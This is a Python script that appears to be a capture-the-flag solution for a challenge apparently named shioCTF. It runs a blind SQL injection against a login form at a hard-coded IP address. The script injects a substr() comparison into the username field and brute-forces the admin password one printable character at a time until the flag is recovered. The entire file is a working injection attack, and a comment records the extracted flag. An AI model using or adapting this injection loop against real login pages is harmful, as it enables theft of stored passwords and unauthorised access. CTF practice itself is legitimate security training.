import sys
import string
import requests

flag = "shioCTF{"
# flag = "shioCTF{b1ind_sqli_i5_d4nger0u5!"

while True:
    for c in string.printable:
        res = requests.post(
            "http://20.205.137.99:49999/",
            data={
                "username": f"admin' AND substr(password, 1, {len(flag) + 1}) = '{flag + c}'; -- satoki",
                "password": "omg",
            },
        )
        if "Login successful!" in res.text:
            flag += c
            print(flag)
            if c == "}":
                sys.exit(0)
            break
